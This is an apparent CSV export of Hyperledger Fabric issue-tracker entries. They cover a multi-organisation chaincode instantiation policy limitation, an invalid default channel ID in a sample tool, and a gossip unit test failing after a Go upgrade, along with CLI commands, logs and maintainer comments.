 ;;;","27/Nov/17 11:24 AM;denyeart;The problem is not reproducible and have not heard back from reporter.  The issue will have to be closed.
[~xuanyue202] please re-open if you can still reproduce and provide the requested debug.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Package with instantination policy signed by multiple organizations,FAB-6046,20638,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,cotofei,cotofei,cotofei,06/Sep/17 6:32 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Oct/17 4:03 PM,,,,,,fabric-peer,,,,,,0,Endorser,,,,,," tried to work with some instantiation policy (with your patch under 1.0.1 version on first-network sample)
 it work fine, with policies like ""OR ('Org1MSP.member','Org2MSP.member')"", ""AND ('Org1MSP.admin')"", ""AND ('Org2MSP.admin')"" (all from cli, with or without `signpackage`).
 But if i try to create policy ""AND ('Org1MSP.member','Org2MSP.member')"" and `signpackage`:
{code:java}
# on Org1 peer
peer chaincode package -n mycc -p github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02 -v 4.0 -s -S -i ""AND ('Org1MSP.admin','Org2MSP.member')"" ccpack.out{code}
{code:java}
#on Org2 peer
 peer chaincode signpackage ccpack.out sctest.out
 peer chaincode install sctest.out
 peer chaincode upgrade -o orderer.example.com:7050 -C mychannel -n mycc -v 4.0 -c '{""Args"":[""init"",""a"",""100"",""b"",""200""]}' -P ""OR ('Org1MSP.member','Org2MSP.member')""
 #also try install and upgrade sctest.out on Org1 peer{code}
it get error in upgrade:

Error: Error endorsing chaincode: rpc error: code = Unknown desc = chaincode error (status: 500, message: chaincode instantiation policy violated(Failed to authenticate policy))

 ",,cotofei,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfg7:",,,,,,,,,,,,,,,,,,,,,,,cotofei,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Sep/17 6:35 PM;cotofei;In lscc in checkInstantiationPolicy []*common.SignedData not include signs from SignedCDSPackage;;;","06/Sep/17 9:31 PM;cotofei;Related CR: https://gerrit.hyperledger.org/r/#/c/13183/;;;","08/Sep/17 5:00 AM;muralisr;[~cotofei] As Proposal supports only single signers (currently) InstantiationPolicies are limited to successful evaluation based in single signer. All your succesful cases (""OR ('Org1MSP.member','Org2MSP.member')"", ""AND ('Org1MSP.admin')"", ""AND ('Org2MSP.admin')""  ) fall into that category. The failure case (""AND ('Org1MSP.member','Org2MSP.member')"") requires two signers which is not currently supported.;;;","08/Sep/17 5:09 AM;cotofei;[~muralisr] Thank you, then no bug. I add CR to add this functionality (https://gerrit.hyperledger.org/r/#/c/13183/). 
Can it be merge in master or you have some other plans of these feature?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
modify the default value for brocast_config tool,FAB-6047,20639,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,asaningmaxchain,asaningmaxchain,asaningmaxchain,06/Sep/17 7:43 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Oct/17 1:53 AM,v1.0.2,,,v1.0.3,v1.1.0,fabric-orderer,,,,,,0,,,,,,,"Default Channel ID used in _orderer/sample_clients/broadcast_config_ is {{NewChannelId}}, which violates the rule of channel ID: {{""[a-z][a-z0-9.-]*""}} (lower case only)",,kchristidis,mastersingh24,wl6g11li,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfgf:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,mastersingh24,wl6g11li,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Sep/17 12:47 AM;kchristidis;[~asaningmaxchain] you have assigned this to yourself. Are you working on a changeset? Please update.;;;","30/Sep/17 4:02 PM;asaningmaxchain;ok,i do it right now;;;","30/Sep/17 8:53 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/13999/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix gossip comm UT failure - premature gRPC servicing,FAB-6048,20640,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,06/Sep/17 7:43 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,05/Oct/17 1:19 AM,v1.1.0,,,v1.1.0,,fabric-gossip,,,,,,0,,,,,,,"After we upgraded to go 1.9, the gossip comm module sometimes registers the gRPC service after starting the gRPC server and this results in the following:

{code}
08:54:22 unit-tests_1  | 2017-09-06 08:54:21.898 UTC [gossip/comm#2000] SetDialOpts -> WARN 006 Given an empty set of grpc.DialOption, aborting
08:54:22 unit-tests_1  | 2017-09-06 08:54:21.898 UTC [gossip/comm#3000] SetDialOpts -> WARN 007 Given an empty set of grpc.DialOption, aborting
08:54:22 unit-tests_1  | 2017-09-06 08:54:22.901 UTC [grpc] Fatalf -> CRIT 008 grpc: Server.RegisterService after Server.Serve for ""gossip.Gossip""
08:54:22 unit-tests_1  | FAIL	github.com/hyperledger/fabric/gossip/comm	20.194s
08:54:22 unit-tests_1  | error: exit status 1
08:54:22 unit-tests_1  | panic: EOF
08:54:22 unit-tests_1  | 
08:54:22 unit-tests_1  | goroutine 1 [running]:
08:54:22 unit-tests_1  | panic(0x4daca0, 0xc42000a0f0)
08:54:22 unit-tests_1  | 	/opt/go/src/runtime/panic.go:500 +0x1a1
08:54:22 unit-tests_1  | main.main()
08:54:22 unit-tests_1  | 	/opt/gotools/obj/gopath/src/github.com/AlekSi/gocov-xml/gocov-xml.go:60 +0x15fd
{code}",,harsha544,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyfgn:",,,,,,,,,,,,,,,,,,,,,,,harsha544,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
